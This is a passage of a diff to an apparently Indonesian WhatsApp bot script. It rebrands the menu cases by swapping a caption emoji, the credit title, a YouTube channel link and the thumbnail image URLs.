 }}, { quoted:m})
 }
@@ -4536,13 +4507,13 @@ break
 case 'asupanmata': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] Asupan Mata* 
+ *[ 🗿 ] Asupan Mata* 
 bokep`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4551,18 +4522,18 @@ break
 case 'searchmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-*[ 🌷 ] Search Menu* 
+*[ 🗿 ] Search Menu* 
 gimage [query]
 pinterest [query]
 wallpaper [query]
 wikimedia [query]
 ringtone [query]
 searchgroups [query]`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4571,7 +4542,7 @@ break
 case 'scrapconvert': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-*[ 🌷 ] Scrap Convert* 
+*[ 🗿 ] Scrap Convert* 
 attp
 ttp
 toimage
@@ -4590,11 +4561,11 @@ dbinary
 styletext
 smeme
 ss [url]`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4603,16 +4574,16 @@ break
 case 'cmdmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-*[ 🌷 ] Cmd Menu* 
+*[ 🗿 ] Cmd Menu* 
 setcmd
 listcmd
 delcmd
 lockcmd`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4621,14 +4592,14 @@ break
 case 'downloadmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-*[ 🌷 ] Download Menu* 
+*[ 🗿 ] Download Menu* 
 pinterestdl [url]
 mediafire [url]`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4637,7 +4608,7 @@ break
 case 'ownermenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] Owner Menu* 
+ *[ 🗿 ] Owner Menu* 
 react [emoji]
 chat [option]
 join [link]
@@ -4658,11 +4629,11 @@ listpc
 listgc
 listonline
 speedtest`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4671,7 +4642,7 @@ break
 case 'scraperimage': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] Scraper Image* 
+ *[ 🗿 ] Scraper Image* 
 coffe
 quotesanime
 couple
@@ -4708,11 +4679,11 @@ handhold
 darkjoke
 meme
 meme2`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4721,7 +4692,7 @@ break
 case 'randomsound': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] Sound Menu* 
+ *[ 🗿 ] Sound Menu* 
 sound1
 sound2
 sound3
@@ -4883,11 +4854,11 @@ sound158
 sound159
 sound160
 sound161`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
